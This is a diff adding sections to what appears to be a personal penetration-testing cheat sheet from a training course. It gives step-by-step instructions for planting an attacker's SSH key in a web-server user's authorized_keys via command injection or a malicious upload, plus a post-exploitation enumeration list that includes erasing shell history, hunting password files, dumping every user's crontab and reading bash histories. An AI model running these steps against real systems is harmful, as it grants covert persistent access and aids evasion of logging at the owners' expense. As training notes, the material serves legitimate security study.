@@ -116,6 +116,47 @@ cat ~/.ssh/id_rsa.pub
 echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
 cat /users/home/directory/.ssh/authorized_keys
 ```
+## SSH key stuff
+```
+ssh-keygen -t rsa
+cat ~/.ssh/id_rsa.pub
+
+```
+### SSH Key Upload
+```
+Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system. By uploading our key to the target, we can give ourselves access without needing a password.
+
+SSH Key Setup
+Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
+
+ ssh-keygen -t rsa
+After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
+
+ cat ~/.ssh/id_rsa.pub
+```
+### Uploading SSH Key
+```
+On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
+
+The following process is done on target through command injection or malicious upload.
+Find out what account is running the web sever/commands.
+
+ whoami
+Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.
+
+ www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.
+Check to see if .ssh folder is in the users home directory. If not make it
+
+ ls -la /users/home/directory      #check if .ssh exists
+ mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+Echo ssh key to the authorized_keys file in the users .ssh folder.
+
+ echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+Verify key has been uploaded successfully.
+
+ cat /users/home/directory/.ssh/authorized_keys
+Once this process has be finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.
+```
 ## ssh with keys
 ```
 ssh -i .ssh/id_rsa -MS /tmp/demo www-data@10.50.28.11
@@ -170,6 +211,11 @@ select table_schema, table_name, column_name from information_schema.columns
 select username, passwd, studentID from session.userinfo ;
 select carid, type from session.cars ;
 ```
+## webex1
+
+
+
+
 
 ## SQL injection
 ```
@@ -459,7 +505,166 @@ sudo -l
 ```
 
 
+## Linux enumeration commands 
+```
+***************************
+* System Characterization *
+***************************
+    \unset HISTFILE HISTSIZE HISTFILESIZE                   - removes the history of your current commands
+    date                                                    - current system date and time
+    uname -a                                                - prints kernel name, release, and version
+    	uname -r                                            - prints kernel release
+    	cat /etc/*rel*                                      - prints information regarding the OS
+    	cat /etc/issue (distro)
+    ifconfig -a                                             - prints netowrk information/conkfiguration
+    w                                                       - prints logged on users and what they are doing
+    last                                                    - show a listing of last logged in users
+    uptime                                                  - shows how long the system has been running
+    hostid                                                  - print the numeric identifier for the current host
+    vmstat                                                  - prints virtual memory statistics
+    hostname                                                - show or set the system's host name
+    arp -an                                                 - print the ARP cache
+    netstat -rn                                             - prints the kernel routing tables
 
+    Linux
+    	cat /proc/cpuinfo
+    	lsmod                                               - lists the loaded modules
+    	ip route show (Newer Linux)                         - lists the kernel routing tables
+
+    Solaris
+    	psrinfo -v (processor info)
+    	modinfo -c (list all the kernel modules)
+
+    ps -efH                                                 - prints every process on the system using standard syntax with process hierarchy
+    netstat -tunap                                          - print all network connections with associated PID
+
+
+*************
+* Processes *
+*************
+Linux
+    pstree                                                  - display a tree of processes
+    ps -auxf                                                - prints every process on the system including CPU and MEM usage
+    ps -efH (elf)                                           - prints every process on the system using standard syntax with process hierarchy
+    lsof                                                    - lists all open files belonging to all active processes
+        lsof -p <pid>
+    	lsof -c <command_name>                              - listing of files for processes executing the command <command_name>
+    	lsof -i <4|6>                                       - only files of the indicated IP version, IPv4 or IPv6, are displayed
+    logs
+    	grep <process_name> /var/log/*                      - search through all files in the directory for a file containing <process_name>
+    	tail -f /var/log/messages                           - prints the last 10 lines of /var/log/messages
+    find / -name *<process_name>*                           - starting in "/", find something conatining the phrase <process_name>
+    chkconfig --list | grep <process_name>                  - queries runlevel information for system services
+
+Solaris
+    ptree
+    ps
+    	running from /tmp, /var/tmp, or any user's home directory
+    	running from a location outside a /bin or /sbin or /opt directory may deserve special scrutiny
+    	Odd options for services
+
+    By comparing the output of the pfiles /proc/* command and the outputs of the netstat -an and rpcinfo -p commands, you can identify services
+    	By cross-referencing listening port numbers in the netstat -na output with ports found in the output of the pfiles `echo /proc/*` command, the output from ps -ef, and the list of well-known ports, you can determine running services
+
+***********************
+* Network Connections *
+***********************
+arp -an                                                     - (default gateway)
+netstat -rn                                                 - (routing table)
+
+Linux
+    netstat -auntp
+    	ss -an                                              - (show all sockets without name resolution)
+    	ss -anp                                             - (show process information as well)
+    	ss -aep                                             - (show all sockets with detailed information and process associated)
+    lsof (not on CentOS)
+    	readlink -f /proc/<PID>/exe
+    /proc/
+    	ls -al /proc/<pid>
+    ls -al /proc/<pid>/fd | grep \/                         - (only directories are seen)
+    cat /proc/<pid>/maps
+    ps -fp <PID>
+
+Solaris
+    netstat -anP tcp
+    	-anP udp
+    pfiles
+    /proc/
+
+    pfiles `ptree | awk '{print $1}'`| egrep '^[0-9]|port:' >> /tmp/ports
+    	rpcinfo -p
+
+*********
+* Other *
+*********
+/etc/passwd
+    /bin/false or /bin/nologin for system services
+    find / -name password.txt > /tmp/pwdfiles &
+
+Command history
+    history
+
+PPID
+
+Dump services
+    Solaris
+    	svcs
+    Linux
+    	service --status-all
+    	chkconfig --list
+
+Networking for services
+    lsof -i
+    pfiles `ptree | awk '{print $1}'`| egrep '^[0-9]|port:'
+
+Logging
+    grep -R <service-name> /var/log
+    file /var/log/secure; file /var/log/wtmp; file /var/log/messages
+    head[tail] /var/log/[secure | messages]
+    strings /var/log/wtmp
+
+IPTables
+    iptables --list
+    iptables --list -t nat
+    /etc/sysconfig/iptables
+
+    ip6tables --list
+    ip6tables --list -t nat
+    /etc/sysconfig/ip6tables
+
+Locations to check
+    /
+    /tmp
+    /home
+    /dev/shm
+
+    find for all hidden files
+    	find / -type f -name ".*"
+    find for all hidden directories
+    	find / -type d -name ".*"
+
+USERSPACE INITIALIZATION FILES
+    Initialization files
+    	/etc/inittab
+    	/etc/rc.d/rc
+    	/etc/rc.d/rc.sysinit
+    	/etc/rc.d/rc.local
+    	/etc/rc.d/rc#.d/ rc scripts
+
+    Init scripts
+
+    Scheduled tasks
+    	ls -l /etc/cron*
+    	/var/spool/crontab
+    		for user in $(cut -f1 -d: /etc/passwd); do echo $user >> /tmp/crontabs; crontab -u $user -l >> /tmp/crontabs; done
+    	at
+    		/var/spool/at
+
+    Login scripts
+    	user home directories
+    		cat /home/user/.bash_history
+    		cat /home/user/.rc.local
+```
 
 
 
